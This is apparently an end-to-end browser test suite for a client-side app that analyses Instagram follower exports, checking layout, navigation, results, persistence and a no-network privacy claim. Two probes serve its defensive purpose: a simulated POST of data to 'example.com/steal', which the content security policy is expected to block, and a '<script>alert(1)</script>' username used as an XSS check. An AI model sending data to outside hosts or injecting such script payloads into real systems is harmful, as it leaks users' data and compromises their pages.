/**
 * End-to-end tests: drives the real app in a real browser.
 *
 * The most important test in this file is the network one. The product claim
 * is that your data never leaves your device, so that claim gets an assertion
 * rather than a paragraph.
 */
import { loadPlaywright, chromiumLaunchOptions } from './browser.mjs';
const { chromium, devices } = await loadPlaywright();
import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { extname, join, normalize } from 'node:path';

const ROOT = new URL('..', import.meta.url).pathname;
const FIXTURES = join(ROOT, 'tests/fixtures');
const TYPES = { '.html':'text/html', '.js':'text/javascript', '.css':'text/css',
                '.json':'application/json', '.zip':'application/zip' };

const server = createServer(async (req, res) => {
  try {
    const path = join(ROOT, normalize(decodeURIComponent(req.url.split('?')[0])));
    const body = await readFile(path);
    res.writeHead(200, { 'Content-Type': TYPES[extname(path)] || 'application/octet-stream' });
    res.end(body);
  } catch { res.writeHead(404); res.end('not found'); }
});
await new Promise((r) => server.listen(0, r));
const BASE = `http://localhost:${server.address().port}`;

let passed = 0, failed = 0;
const check = (label, ok, detail) => {
  console.log(`${ok ? '  ✓' : '  ✗'} ${label}`);
  if (ok) passed++; else { failed++; if (detail !== undefined) console.log('     ', detail); }
};
const equal = (label, actual, expected) =>
  check(label, JSON.stringify(actual) === JSON.stringify(expected),
        `expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
const group = (name) => console.log(`\n${name}`);

const browser = await chromium.launch(chromiumLaunchOptions());

/* ============================================================ */
group('Mobile layout — iPhone SE (375×667)');

const phone = await browser.newContext({ ...devices['iPhone SE'], acceptDownloads: true });
const page = await phone.newPage();

const pageErrors = [];
page.on('pageerror', (e) => pageErrors.push(String(e)));
page.on('console', (m) => { if (m.type() === 'error') pageErrors.push(m.text()); });

// Every http(s) request the page makes, recorded from the very first byte.
const networkLog = [];
page.on('request', (r) => {
  if (/^https?:/.test(r.url())) networkLog.push(r.url());
});

await page.goto(`${BASE}/index.html`);
await page.waitForSelector('[data-screen="home"]:not([hidden])');

const fitsViewport = await page.evaluate(() =>
  document.documentElement.scrollHeight <= window.innerHeight + 1);
check('landing screen fits without scrolling', fitsViewport,
  await page.evaluate(() => `content ${document.documentElement.scrollHeight}px vs viewport ${window.innerHeight}px`));

const smallTargets = await page.evaluate(() => {
  const tooSmall = [];
  for (const el of document.querySelectorAll('[data-screen="home"]:not([hidden]) button, [data-screen="home"]:not([hidden]) a')) {
    const r = el.getBoundingClientRect();
    if (r.width > 0 && (r.height < 44 || r.width < 44)) {
      tooSmall.push(`${el.tagName}.${el.className}: ${Math.round(r.width)}×${Math.round(r.height)}`);
    }
  }
  return tooSmall;
});
equal('all landing tap targets are at least 44px', smallTargets, []);

check('privacy claim is on the first screen',
  (await page.textContent('[data-screen="home"]')).includes('100% on your device'));

/* ============================================================ */
group('Wizard navigation');

await page.click('button[data-go="how"]');
await page.waitForSelector('[data-screen="how"]:not([hidden])');
check('Get started opens the instructions', true);
check('URL hash tracks the screen', page.url().endsWith('#/how'), page.url());

const iosSelected = await page.getAttribute('[data-device="ios"]', 'aria-selected');
const androidSelected = await page.getAttribute('[data-device="android"]', 'aria-selected');
check('iPhone tab auto-selected from the user agent',
  iosSelected === 'true' && androidSelected === 'false', { iosSelected, androidSelected });

check('iPhone steps mention the Files app',
  (await page.textContent('#steps-content')).includes('Files'));
check('the callout warns that Instagram pre-selects everything',
  (await page.textContent('.callout')).includes('pre-selects'),
  await page.textContent('.callout'));
check('the steps name the current menu, not the old one',
  (await page.textContent('#steps-content')).includes('Export your information'));

// iOS is the only path with the Files-app unzip fallback, so it is what
// actually distinguishes the two tabs.
check('iPhone steps include the Files app unzip fallback',
  (await page.textContent('#steps-content')).includes('Uncompress'));
await page.click('[data-device="android"]');
check('switching to Android swaps the steps',
  !(await page.textContent('#steps-content')).includes('Uncompress'),
  await page.textContent('#steps-content'));

await page.click('button[data-go="upload"]');
await page.waitForSelector('[data-screen="upload"]:not([hidden])');
check('folder picker hidden on mobile (iOS Safari has no folder input)',
  await page.isHidden('#pick-folder'));

await page.goBack();
await page.waitForSelector('[data-screen="how"]:not([hidden])');
check('browser back button returns to the previous step', true);
await page.goForward();
await page.waitForSelector('[data-screen="upload"]:not([hidden])');

/* ============================================================ */
group('Upload and results');

// Everything from here is what matters for the privacy assertion.
const requestsBeforeUpload = networkLog.length;

await page.setInputFiles('#file-input', join(FIXTURES, 'export-small.zip'));
await page.waitForSelector('[data-screen="results"]:not([hidden])', { timeout: 15000 });

const stats = await page.$$eval('.stat', (tiles) =>
  tiles.map((t) => [t.querySelector('.stat__label').textContent,
                    t.querySelector('.stat__value').textContent]));
equal('summary tiles', stats, [
  ["Don't follow you back", '4'],
  ['Followers', '5'],
  ['Following', '7'],
  ['Fans', '2'],
  ['Mutuals', '3'],
]);

// Measured here, before the deliberate reload later in this file re-fetches
// the app's own assets. This is the assertion the whole product rests on.
const duringUpload = networkLog.slice(requestsBeforeUpload);
equal('reading the file caused zero network requests', duringUpload, []);
console.log(`     (${requestsBeforeUpload} requests to load the app, ${duringUpload.length} while processing your data)`);

const rowNames = await page.$$eval('.account__name', (els) => els.map((e) => e.textContent));
equal('the headline list is correct', rowNames.sort(),
  ['@<script>alert(1)</script>', '@charlie', '@dave', '@ünïcode_user']);

const rendered = await page.evaluate(() => {
  const el = [...document.querySelectorAll('.account__name')].find((n) => n.textContent.includes('script'));
  return { text: el.textContent, injected: document.querySelectorAll('.account script').length };
});
check('a markup-shaped username renders as text, not as an element',
  rendered.injected === 0 && rendered.text === '@<script>alert(1)</script>', rendered);

const visitHref = await page.getAttribute('.account__visit', 'href');
check('profile links point at instagram.com over https',
  visitHref.startsWith('https://www.instagram.com/'), visitHref);

check('the active view is marked pressed for assistive tech',
  (await page.getAttribute('.tab[data-tab-id="notFollowingBack"]', 'aria-pressed')) === 'true'
  && (await page.getAttribute('.tab[data-tab-id="fans"]', 'aria-pressed')) === 'false');

const metaText = await page.textContent('.account:has(.account__name:text-is("@charlie")) .account__meta');
check('follow date shown as a relative time', /ago$/.test(metaText), metaText);
check('...with the full sentence and exact date on hover',
  /^Followed on .*\d{4}/.test(
    await page.getAttribute('.account:has(.account__name:text-is("@charlie")) .account__meta', 'title')));

const noEllipsis = await page.evaluate(() => {
  const bad = [];
  for (const el of document.querySelectorAll('.account__meta')) {
    if (el.scrollWidth > el.clientWidth + 1) bad.push(el.textContent);
  }
  return bad;
});
equal('no follow date is truncated at 320px', noEllipsis, []);

await page.click('.tab[data-tab-id="fans"]');
const fanNames = await page.$$eval('.account__name', (els) => els.map((e) => e.textContent).sort());
equal('Fans tab', fanNames, ['@mallory', '@zoe']);

await page.click('.tab[data-tab-id="notFollowingBack"]');
await page.fill('#search', 'char');
equal('search filters the list',
  await page.$$eval('.account__name', (els) => els.map((e) => e.textContent)), ['@charlie']);
check('search result count is announced',
  (await page.textContent('#list-meta')).includes('1 of 4'), await page.textContent('#list-meta'));
await page.fill('#search', '');

/* ============================================================ */
group('Summary tiles as navigation');

equal('every tile switches the list to a view of its own',
  await page.$$eval('.stat', (tiles) => tiles.map((t) => t.dataset.tabId)),
  ['notFollowingBack', 'followers', 'following', 'fans', 'mutuals']);

check('the tile for the view you are on is marked pressed',
  (await page.getAttribute('.stat[data-tab-id="notFollowingBack"]', 'aria-pressed')) === 'true');

await page.click('.stat[data-tab-id="followers"]');
equal('tapping Followers shows the followers themselves',
  await page.$$eval('.account__name', (els) => els.map((e) => e.textContent).sort()),
  ['@MIXEDCASE', '@alice', '@bob', '@mallory', '@zoe']);
equal('...and the tile and the tab agree on what is showing',
  await page.$$eval('.stat[aria-pressed="true"], .tab[aria-pressed="true"]',
    (els) => els.map((e) => e.dataset.tabId)),
  ['followers', 'followers']);

await page.click('.stat[data-tab-id="following"]');
equal('tapping Following shows all 7 accounts you follow',
  await page.$$eval('.account__name', (els) => els.length), 7);
await page.click('.stat[data-tab-id="notFollowingBack"]');

/* ============================================================ */
group('Following-count explainer');

// The explanation is behind the "i" rather than on the screen, so the results
// open on the answer instead of on a paragraph about the answer.
equal('nothing is spent on the count note until there is something to say',
  (await page.textContent('#count-note')).trim(), '');
check('the dialog stays closed until asked for', await page.isHidden('#count-dialog'));

await page.click('.stat__info');
check('the "i" on the Following tile opens the explainer',
  await page.isVisible('#count-dialog'));
check('...carrying the counts that used to sit on the results screen',
  (await page.textContent('#count-dialog-counts')).includes('5 followers, 7 following'),
  await page.textContent('#count-dialog-counts'));
check('...and the deleted-account explanation with it',
  (await page.textContent('#count-dialog')).includes("page isn't available"));

await page.click('#count-differs');
await page.fill('#count-input', '5');
await page.click('#count-save');
const ghostText = await page.textContent('#count-result');
check('a profile count of 5 against 7 in the file names 2 dead accounts',
  ghostText.startsWith('2 profiles are deleted or deactivated'), ghostText);
check('...and says where they are',
  ghostText.includes("Doesn't follow back"), ghostText);

await page.click('#count-show-list');
check('"Show that list" closes the dialog on the headline list',
  (await page.isHidden('#count-dialog'))
  && (await page.getAttribute('.tab[data-tab-id="notFollowingBack"]', 'aria-pressed')) === 'true');
equal('the Following tile is corrected to the profile number',
  await page.textContent('.stat[data-tab-id="following"] .stat__value'), '5');
equal('...with the export figure kept as a footnote',
  await page.textContent('.stat[data-tab-id="following"] .stat__note'), '7 in your export');
check('the short note explains the gap in one line',
  (await page.textContent('#count-note')).startsWith('2 of the 7 accounts'),
  await page.textContent('#count-note'));

// A number the browser's own validation lets through - "1.5" is typeable in a
// number input - still has to be rejected rather than quietly floored.
await page.click('.stat__info');
await page.click('#count-differs');
await page.fill('#count-input', '1.5');
await page.click('#count-save');
check('a fractional count is refused', (await page.textContent('#count-error')).length > 0);

await page.fill('#count-input', '900');
await page.click('#count-save');
check('a profile count above the export is explained, not subtracted',
  (await page.textContent('#count-result')).includes('snapshot'),
  await page.textContent('#count-result'));
equal('...and the tile goes back to the export figure',
  await page.textContent('.stat[data-tab-id="following"] .stat__value'), '7');
equal('...leaving no note behind', (await page.textContent('#count-note')).trim(), '');
await page.click('#count-close');

/* ============================================================ */
group('Opening a profile ticks it off');

const daveRow = '.account:has(.account__name:text-is("@dave"))';
check('a row starts unticked', !(await page.isChecked(`${daveRow} input[type=checkbox]`)));

const [profileTab] = await Promise.all([
  phone.waitForEvent('page').catch(() => null),
  page.click(`${daveRow} .account__link`),
]);
if (profileTab) await profileTab.close();
check('tapping the avatar and name opens the profile and ticks the row',
  await page.isChecked(`${daveRow} input[type=checkbox]`));
check('...and that tick is saved like any other',
  (await page.evaluate(() => localStorage.getItem('insta-nfb:handled:v1'))).includes('dave'));

await page.click(`${daveRow} input[type=checkbox]`);
check('a row ticked by opening it can be unticked again',
  !(await page.isChecked(`${daveRow} input[type=checkbox]`)));

const [openTab] = await Promise.all([
  phone.waitForEvent('page').catch(() => null),
  page.click(`${daveRow} .account__visit`),
]);
if (openTab) await openTab.close();
check('the Open button ticks the row too',
  await page.isChecked(`${daveRow} input[type=checkbox]`));
// Left as the persistence group expects to find it.
await page.click(`${daveRow} input[type=checkbox]`);

/* ============================================================ */
group('Checklist persistence');

await page.click('.account:has(.account__name:text-is("@charlie")) input[type=checkbox]');
const savedAfterCheck = await page.evaluate(() => localStorage.getItem('insta-nfb:handled:v1'));
check('checking a row saves it', savedAfterCheck && savedAfterCheck.includes('charlie'), savedAfterCheck);

await page.reload();
await page.waitForSelector('[data-screen="upload"]:not([hidden])');
check('a reload drops the results (data is never persisted)', true);

await page.setInputFiles('#file-input', join(FIXTURES, 'export-small.zip'));
await page.waitForSelector('[data-screen="results"]:not([hidden])');
const stillChecked = await page.isChecked('.account:has(.account__name:text-is("@charlie")) input[type=checkbox]');
check('progress survives the reload', stillChecked);

await page.click('#clear-data');
check('Clear saved progress empties storage',
  !(await page.evaluate(() => localStorage.getItem('insta-nfb:handled:v1')))
  || (await page.evaluate(() => localStorage.getItem('insta-nfb:handled:v1'))) === '[]');

/* ============================================================ */
group('CSV download (must work under the strict CSP)');

const [download] = await Promise.all([
  page.waitForEvent('download', { timeout: 10000 }).catch(() => null),
  page.click('#download-csv'),
]);
check('clicking Download CSV produces a file', download !== null);
if (download) {
  equal('with a sensible filename', download.suggestedFilename(), 'instagram-notFollowingBack.csv');
  const stream = await download.createReadStream();
  let csv = '';
  for await (const chunk of stream) csv += chunk;
  check('CSV contains the expected rows',
    csv.includes('charlie') && csv.includes('dave') && csv.startsWith('username,profile_url'),
    csv.slice(0, 120));
}

/* ============================================================ */
group('THE privacy assertion');

const foreignOrigins = [...new Set(networkLog.map((u) => new URL(u).origin))]
  .filter((origin) => origin !== BASE);
equal('the app never contacted any origin but its own', foreignOrigins, []);
console.log(`     (${networkLog.length} requests total this session, all to ${BASE})`);

const cspBlocked = [];
page.on('console', (m) => { if (/Content Security Policy/i.test(m.text())) cspBlocked.push(m.text()); });
const exfiltration = await page.evaluate(async () => {
  try {
    await fetch('https://example.com/steal', { method: 'POST', body: 'data' });
    return 'REQUEST WENT THROUGH';
  } catch (e) {
    return `blocked: ${e.name}`;
  }
});
check('an attempt to upload data is blocked by the browser',
  exfiltration.startsWith('blocked:'), exfiltration);

/* ============================================================ */
group('Error handling');

await page.click('#start-over');
await page.waitForSelector('[data-screen="home"]:not([hidden])');
await page.click('button[data-go="how"]');
await page.click('button[data-go="upload"]');

await page.setInputFiles('#file-input', join(FIXTURES, 'not-a-zip.zip'));
await page.waitForSelector('.status--error', { timeout: 10000 });
const errorText = await page.textContent('#upload-status');
check('a corrupt file gives a helpful message, not a crash',
  errorText.includes('followers_1.json') && errorText.includes('following.json'), errorText);
check('still on the upload screen', await page.isVisible('[data-screen="upload"]:not([hidden])'));

await page.setInputFiles('#file-input', join(FIXTURES, 'not-a-zip.zip'));
await page.waitForSelector('.status--error', { timeout: 10000 });
check('re-picking the same file still triggers a retry', true);

await page.setInputFiles('#file-input', join(FIXTURES, 'export-html.zip'));
await page.waitForSelector('[data-screen="results"]:not([hidden])', { timeout: 10000 });
check('the HTML export is accepted, not rejected',
  (await page.textContent('#notices')).includes('HTML export'),
  await page.textContent('#notices'));
const sortOptions = await page.$$eval('#sort option:not([hidden])', (o) => o.map((x) => x.value));
equal('date sorting hidden for HTML (no real timestamps to sort by)', sortOptions, ['username']);

/* ============================================================ */
group('Desktop layout (1280×800)');

const desktop = await browser.newContext({ viewport: { width: 1280, height: 800 } });
const deskPage = await desktop.newPage();
await deskPage.goto(`${BASE}/index.html`);
await deskPage.click('button[data-go="how"]');
check('Computer tab auto-selected on desktop',
  (await deskPage.getAttribute('[data-device="desktop"]', 'aria-selected')) === 'true');
await deskPage.click('button[data-go="upload"]');
await deskPage.waitForSelector('[data-screen="upload"]:not([hidden])');
check('folder picker offered on desktop', await deskPage.isVisible('#pick-folder'));

await deskPage.setInputFiles('#file-input', [
  join(FIXTURES, 'json/followers_1.json'),
  join(FIXTURES, 'json/followers_2.json'),
  join(FIXTURES, 'json/following.json'),
]);
await deskPage.waitForSelector('[data-screen="results"]:not([hidden])', { timeout: 10000 });
check('loose JSON files (not a ZIP) work',
  (await deskPage.textContent('.stat--headline .stat__value')) === '4');

/* ============================================================ */
group('360px-wide screen');
const narrow = await browser.newContext({ viewport: { width: 360, height: 640 }, isMobile: true, hasTouch: true });
const narrowPage = await narrow.newPage();
await narrowPage.goto(`${BASE}/index.html`);
await narrowPage.waitForSelector('[data-screen="home"]:not([hidden])');
check('landing fits at 360×640',
  await narrowPage.evaluate(() => document.documentElement.scrollHeight <= window.innerHeight + 1),
  await narrowPage.evaluate(() => `${document.documentElement.scrollHeight} vs ${window.innerHeight}`));
check('no horizontal overflow anywhere',
  await narrowPage.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1));

await narrowPage.screenshot({ path: 'tests/screenshot-landing.png' });
await narrowPage.click('button[data-go="how"]');
await narrowPage.waitForSelector('[data-screen="how"]:not([hidden])');
await narrowPage.screenshot({ path: 'tests/screenshot-steps.png', fullPage: true });
await narrowPage.click('button[data-go="upload"]');
await narrowPage.waitForSelector('[data-screen="upload"]:not([hidden])');
await narrowPage.setInputFiles('#file-input', join(FIXTURES, 'export-small.zip'));
await narrowPage.waitForSelector('[data-screen="results"]:not([hidden])');
await narrowPage.screenshot({ path: 'tests/screenshot-results.png', fullPage: true });

/* ============================================================ */
console.log('\n' + '='.repeat(60));
if (pageErrors.length) {
  console.log('PAGE ERRORS:');
  for (const e of pageErrors) console.log('  ' + e);
}
console.log(`passed=${passed} failed=${failed}`);

await browser.close();
server.close();
// The exfiltration test deliberately provokes a CSP violation, so those
// messages are the suite working as intended rather than a defect.
const unexpectedErrors = pageErrors.filter(
  (e) => !/favicon/i.test(e) && !/Content Security Policy|example\.com\/steal/i.test(e)
);
if (unexpectedErrors.length) console.log('UNEXPECTED:', unexpectedErrors);
process.exit(failed === 0 && unexpectedErrors.length === 0 ? 0 : 1);
